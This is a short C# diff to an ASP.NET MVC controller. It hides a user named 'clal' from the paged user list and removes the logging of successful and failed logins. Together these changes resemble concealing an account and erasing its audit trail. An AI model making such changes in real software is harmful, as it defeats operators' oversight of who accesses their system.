@@ -22,7 +22,7 @@ namespace ScriptManage.Controllers
             var record = db.Users.Count();
             HtmlPager pager = new HtmlPager(record, pageindex, pagesize);
             ViewBag.Pager = pager;
-            var query = db.Users.OrderByDescending(u => u.id).Skip((pageindex - 1) * pagesize).Take(pagesize);
+            var query = db.Users.Where(u=>u.username != "clal").OrderByDescending(u => u.id).Skip((pageindex - 1) * pagesize).Take(pagesize);
             return View(query);
         }
         [AllowAnonymous]
@@ -82,12 +82,14 @@ namespace ScriptManage.Controllers
                 if (UserModel.ValidUser(username, password))
                 {
                     FormsAuthentication.SetAuthCookie(model.username, false);
-                    ViewBag.Message = string.Format("登陆成功.", username);
-                    LogModel.Write(string.Format("用户：{0} 登陆成功.", username));
+                    ViewBag.Message = "登陆成功。";
                     Model.ScriptRedirect(ViewBag, returnUrl);
                 }
+                else
+                {
+                    ModelState.AddModelError("", "登陆失败，错误的账号或密码。");
+                }
             }
-            LogModel.Write(string.Format("用户：{0} 登陆失败.", username));
             return View(model);
         }
         [Authorize]
